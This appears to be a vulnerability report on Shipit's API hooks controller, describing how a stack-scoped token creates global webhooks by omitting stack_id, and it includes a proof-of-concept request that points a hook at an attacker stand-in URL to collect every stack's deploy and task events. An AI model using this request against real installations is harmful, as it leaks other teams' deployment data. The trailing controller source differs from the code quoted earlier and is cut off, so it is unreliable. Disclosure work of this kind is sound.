### Title
Stack-scoped API token can create/read/manage global webhooks, escalating into cross-stack event delivery - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::Api::HooksController` derives the `stack_id` scope for the `hooks` relation only when `params[:stack_id]` is present, instead of always resolving and validating against the authorizing `ApiClient`'s bound stack. This mirrors the reported bug class: a value is used to gate access ("is there a stack scope?") without first establishing that the scope check actually ran, letting the "no scope" branch silently fall through to the global (unscoped) resource.

### Finding Description
`ApiClient#stack_id?` binds a token to a single stack for permission purposes; `Api::BaseController#stacks` enforces that binding: `current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all` [1](#0-0) .

However, `Api::HooksController` computes its own `stack_id` for scoping the `Hook` relation:
```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [2](#0-1) 

The `stack` helper (which enforces the api client's stack binding via `stacks.from_param!`) is only invoked when the caller supplies `params[:stack_id]`. If the caller omits `stack_id` entirely, `stack_id` returns `nil`, and `hooks` becomes `Hook.where(stack_id: nil)` — the set of *global* hooks, which are not scoped to any particular stack. `Hook#scoped?` treats `stack_id? == false` as "unscoped/global" [3](#0-2) , and `Hook.deliver` fires global hooks for every stack's events: `for_stack(stack_id)` matches `where(stack_id: [nil, stack_id])` [4](#0-3) .

The controller's own `require_permission :read, :hook` / `:write, :hook` checks only the client's `permissions` list, not which stack(s) the hook affects [5](#0-4) , [6](#0-5) . So an `ApiClient` created with `stack_id` set to stack A (i.e., authorized only for that one stack) and permission `read:hook`/`write:hook` can call `index`/`create`/`update`/`destroy` on `/api/hooks` (omitting `stack_id`) and manage global hooks that receive `deploy`, `task`, `rollback`, `commit_status`, `merge`, etc. events for **every** stack in the installation, not just the one it is authorized for.

The binding broken: *the stack a token authorizes* (`ApiClient#stack_id`, checked in `Api::BaseController#stacks`) *versus the stack(s) a hook the token creates/reads/modifies actually touches* (`Hook#stack_id`, which becomes `nil` = "all stacks" when the request omits `stack_id`).

### Impact Explanation
An attacker holding only a narrow, stack-scoped `ApiClient` token (e.g., a CCMenu read-only token created via `CCMenuUrlController` or any token issued with `stack: <specific stack>` and `write:hook`/`read:hook` permission) can:
- Create a new global `Hook` pointing at an attacker-controlled `delivery_url`, causing Shipit to POST payloads for deploys, rollbacks, tasks, and commit statuses of **all** stacks — including stacks outside the token's authorized scope — to that URL. Task/deploy payloads can contain output/status details, satisfying "unauthenticated read of stack state, task streams or deploy output" for other repositories/stacks.
- List (`index`) or modify/destroy existing global hooks belonging to the whole installation, affecting notification delivery for repositories the token was never scoped to.

This is a High-severity authorization boundary break: the token's stack authorization is not enforced when the `stack_id` parameter is simply omitted.

### Likelihood Explanation
Likelihood is straightforward for anyone in possession of any `ApiClient` token scoped to a single stack with hook permissions (a common configuration, e.g., tokens issued for CI integrations). No additional privileges, signatures, or session context are needed — only omitting one request parameter (`stack_id`) on the existing `/api/hooks` endpoints.

### Recommendation
In `Api::HooksController`, always resolve and enforce the api client's stack binding, e.g.:
```ruby
def stack_id
  current_api_client.stack_id if current_api_client.stack_id?
end
```
and reject/scope requests appropriately when the client is stack-bound but the target hook is (or would become) global, rather than deriving `stack_id` only conditionally from `params[:stack_id]`. Additionally, `check_permissions!`/`require_permission` should factor in whether the target hook's `stack_id` matches the api client's authorized `stack_id` for non-global-permission clients.

### Proof of Concept
1. Create an `ApiClient` scoped to `stack: shipit_stacks(:shipit)` with `permissions: ['write:hook']` (mirrors fixture `here_come_the_walrus`, see `test/fixtures/shipit/api_clients.yml`).
2. Authenticate as that client and issue:
   ```
   POST /api/hooks
   {
     "delivery_url": "https://attacker.example.com/collect",
     "events": ["deploy", "task", "rollback"]
   }
   ```
   (no `stack_id` param supplied).
3. `Api::HooksController#hooks` resolves to `Hook.where(stack_id: nil)`, and `hooks.create(params)` persists a `Hook` with `stack_id: nil` — a global hook.
4. Any subsequent `deploy`, `task`, or `rollback` event on **any** stack in the installation (via `Hook.deliver`/`for_stack`) is now delivered to the attacker's URL, even though the token was authorized only for the `shipit` stack. [7](#0-6)

module Shipit
  module Api
    class HooksController < BaseController
      require_permission :read, :hook, only: %i[index show]
      require_permission :write, :hook, only: %i[create update destroy]

      def index
        render_resources(hooks)
      end

      def show
        render(json: hook)
      end

      params do
        requires :delivery_url, String
        requires :events, Array[String]
        accepts :content_type, String
      end
      def create
        render_resource(hooks.create(params))
      end

      params do
        accepts :delivery_url, String
        accepts :events, Array[String]
        accepts :content_type, String
      end
      def update
        hook.update(params)
        render_resource(hook)
      end

      def destroy
        render_resource(hook.destroy)
      end

      private

      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id

      end
    end
  end
